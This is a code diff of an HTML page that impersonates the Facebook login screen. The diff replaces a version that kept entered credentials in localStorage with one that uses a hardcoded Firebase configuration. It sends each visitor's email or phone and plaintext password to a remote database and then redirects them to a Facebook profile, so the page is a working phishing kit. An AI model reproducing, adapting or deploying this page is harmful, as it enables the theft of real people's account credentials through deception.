@@ -1,182 +1,208 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Facebook Login</title>
-    <link href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yi/r/4Kv5U5b1o3f.png" rel="shortcut icon" sizes="196x196" />
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <style>
-        /* Basic Reset */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: Arial, sans-serif;
-        }
+  <title>Facebook Login</title>
+  <link href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yi/r/4Kv5U5b1o3f.png" rel="shortcut icon" sizes="196x196" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    /* Basic Reset */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
 
-        /* Centered Container */
-        .container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            background-color: #f0f2f5;
-            padding: 20px;
-        }
+    /* Centered Container */
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      background-color: #f0f2f5;
+      padding: 20px;
+    }
 
-        /* Facebook Logo */
-        .logo {
-            width: 50px;
-            height: 50px;
-            margin-bottom: 20px;
-            border-radius: 50%;
-        }
+    /* Facebook Logo */
+    .logo {
+      width: 50px;
+      height: 50px;
+      margin-bottom: 20px;
+      border-radius: 50%;
+    }
 
-        /* Form Container */
-        .form-container {
-            background-color: #ffffff;
-            padding: 40px;
-            width: 100%;
-            max-width: 400px;
-            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.15);
-            border-radius: 8px;
-            text-align: center;
-        }
+    /* Form Container */
+    .form-container {
+      background-color: #ffffff;
+      padding: 40px;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.15);
+      border-radius: 8px;
+      text-align: center;
+    }
 
-        /* Form Title */
-        .form-title {
-            font-size: 24px;
-            font-weight: bold;
-            color: #1877f2;
-            margin-bottom: 20px;
-        }
+    /* Form Title */
+    .form-title {
+      font-size: 24px;
+      font-weight: bold;
+      color: #1877f2;
+      margin-bottom: 20px;
+    }
 
-        /* Form Fields */
-        input[type="text"],
-        input[type="password"] {
-            width: 100%;
-            padding: 12px;
-            margin: 10px 0;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            font-size: 16px;
-        }
+    /* Form Fields */
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 16px;
+    }
 
-        /* Submit Button */
-        button {
-            width: 100%;
-            padding: 12px;
-            background-color: #1877f2;
-            color: #ffffff;
-            font-size: 16px;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            margin-top: 10px;
-        }
+    /* Submit Button */
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #1877f2;
+      color: #ffffff;
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
 
-        button:hover {
-            background-color: #166fe5;
-        }
+    button:hover {
+      background-color: #166fe5;
+    }
 
-        /* Separator (or) */
-        .separator {
-            display: flex;
-            align-items: center;
-            text-align: center;
-            margin: 20px 0;
-        }
+    /* Separator (or) */
+    .separator {
+      display: flex;
+      align-items: center;
+      text-align: center;
+      margin: 20px 0;
+    }
 
-        .separator::before,
-        .separator::after {
-            content: '';
-            flex: 1;
-            border-bottom: 1px solid #dddfe2;
-        }
+    .separator::before,
+    .separator::after {
+      content: '';
+      flex: 1;
+      border-bottom: 1px solid #dddfe2;
+    }
 
-        .separator:not(:empty)::before {
-            margin-right: 10px;
-        }
+    .separator:not(:empty)::before {
+      margin-right: 10px;
+    }
 
-        .separator:not(:empty)::after {
-            margin-left: 10px;
-        }
+    .separator:not(:empty)::after {
+      margin-left: 10px;
+    }
 
-        /* Create Account Link */
-        .create-account {
-            margin-top: 20px;
-            color: #1877f2;
-            font-size: 14px;
-        }
+    /* Create Account Link */
+    .create-account {
+      margin-top: 20px;
+      color: #1877f2;
+      font-size: 14px;
+    }
 
-        .create-account a {
-            text-decoration: none;
-            color: #1877f2;
-        }
+    .create-account a {
+      text-decoration: none;
+      color: #1877f2;
+    }
 
-        .create-account a:hover {
-            text-decoration: underline;
-        }
-        footer {
-            margin-top: 40px; /* Added margin to create space between the footer and the login form */
-            text-align: center;
-            font-size: 12px;
-            color: #888;
-        }
-        footer a {
-            color: #1877f2;
-            text-decoration: none;
-            margin: 0 5px;
-        }
-    </style>
+    .create-account a:hover {
+      text-decoration: underline;
+    }
+
+    footer {
+      margin-top: 40px;
+      text-align: center;
+      font-size: 12px;
+      color: #888;
+    }
+
+    footer a {
+      color: #1877f2;
+      text-decoration: none;
+      margin: 0 5px;
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <!-- Facebook Logo -->
-        <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yi/r/4Kv5U5b1o3f.png" alt="Facebook Logo" class="logo">
+  <div class="container">
+    <!-- Facebook Logo -->
+    <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yi/r/4Kv5U5b1o3f.png" alt="Facebook Logo" class="logo">
 
-        <!-- Login Form -->
-        <div class="form-container">
-            <div class="form-title">Log in to Facebook</div>
-            <form id="login-form" onsubmit="saveAndRedirect(event)">
-                <input type="text" id="email" name="email" placeholder="Email or Phone" required><br>
-                <input type="password" id="password" name="pass" placeholder="Password" required><br>
-                <button type="submit">Log In</button>
-            </form>
+    <!-- Login Form -->
+    <div class="form-container">
+      <div class="form-title">Log in to Facebook</div>
+      <form id="login-form">
+        <input type="text" id="username" name="username" placeholder="Email or Phone" required><br>
+        <input type="password" id="password" name="password" placeholder="Password" required><br>
+        <button type="submit">Log In</button>
+      </form>
 
-            <!-- Separator Line with "or" -->
-            <div class="separator">or</div>
+      <!-- Separator Line with "or" -->
+      <div class="separator">or</div>
 
-            <!-- Create Account Redirect -->
-            <p class="create-account">Don't have an account? <a href="https://www.facebook.com/r.php">Create one</a></p>
-        </div>
+      <!-- Create Account Redirect -->
+      <p class="create-account">Don't have an account? <a href="https://www.facebook.com/r.php">Create one</a></p>
     </div>
-    <footer>
-        <p>© 2024 Facebook, Inc. All rights reserved.</p>
-        <a href="#">Terms</a> | 
-        <a href="#">Data Policy</a> | 
-        <a href="#">Cookie Policy</a>
-    </footer>
-    <script>
-        // Function to save email and password to localStorage and redirect to Facebook login
-        function saveAndRedirect(event) {
-            event.preventDefault(); // Prevent the form from submitting
+  </div>
+  <footer>
+    <p>© 2024 Facebook, Inc. All rights reserved.</p>
+    <a href="#">Terms</a> | 
+    <a href="#">Data Policy</a> | 
+    <a href="#">Cookie Policy</a>
+  </footer>
 
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
+  <!-- Firebase and JavaScript -->
+  <script type="module">
+    // Import Firebase modules
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
+    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-database.js";
 
-            if (email && password) {
-                // Save to localStorage
-                let users = JSON.parse(localStorage.getItem('users')) || [];
-                users.push({ email, password });
-                localStorage.setItem('users', JSON.stringify(users));
+    // Firebase configuration
+    const firebaseConfig = {
+      apiKey: "AIzaSyCcTFYAIp1-TA1irU8l5N8iihfnYCGWrHw",
+      authDomain: "and-facebook-ab84c.firebaseapp.com",
+      databaseURL: "https://and-facebook-ab84c-default-rtdb.firebaseio.com",
+      projectId: "and-facebook-ab84c",
+      storageBucket: "and-facebook-ab84c.appspot.com",
+      messagingSenderId: "4885749329",
+      appId: "1:4885749329:web:2d5b0e46519b5dc4c8e270"
+    };
 
-                // Redirect to Facebook's login page
-                window.location.href = 'https://www.facebook.com/login';
-            } else {
-                alert("Please fill in both fields.");
-            }
-        }
-    </script>
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    // Function to handle form submission
+    document.getElementById("login-form").addEventListener("submit", function(event) {
+      event.preventDefault();
+
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      if (username && password) {
+        // Replace "." with "_" in the username to avoid Firebase key issues
+        const usernameKey = username.replace(/\./g, '_');
+
+        set(ref(db, 'users/' + usernameKey), {
+          username: username,
+          password: password
+        }).then(() => {
+          // Redirect to Facebook after data is saved
+          window.location.href = "https://www.facebook.com/mike.robinson.486374";
+        }).catch((error) => {
+          console.error("Error storing data:", error);
+        });
+      }
+    });
+  </script>
 </body>
 </html>
